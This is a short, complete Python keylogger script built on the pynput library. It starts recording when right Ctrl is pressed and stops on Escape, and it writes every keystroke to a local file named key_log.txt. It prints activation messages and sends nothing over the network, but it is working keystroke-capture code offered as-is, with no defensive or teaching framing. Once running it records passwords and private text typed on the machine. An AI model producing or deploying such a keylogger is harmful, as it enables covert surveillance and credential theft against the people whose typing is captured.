from pynput.keyboard import Listener, Key

# File to save key logs
log_file = "key_log.txt"
logging = False  # Variable to track if logging is active or not

def log_keystroke(key):
    global logging
    # Check if logging is active
    if logging:
        try:
            # Convert the key to a readable format and write to the log file
            key_str = str(key).replace("'", "")
            with open(log_file, "a") as f:
                f.write(key_str + "\n")
        except Exception as e:
            print(f"Error logging keystroke: {e}")

def on_press(key):
    global logging
    # Activate logging on RCTRL key press
    if key == Key.ctrl_r:
        logging = True
        print("Keylogger activated!")
    # Deactivate logging on ESC key press
    elif key == Key.esc:
        logging = False
        print("Keylogger deactivated!")

    # Log the key if logging is active
    log_keystroke(key)

def on_release(key):
    # Stop listener when ESC is pressed
    if key == Key.esc:
        # Stop the listener if ESC is pressed (optional)
        return False

# Set up listener for keystrokes
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
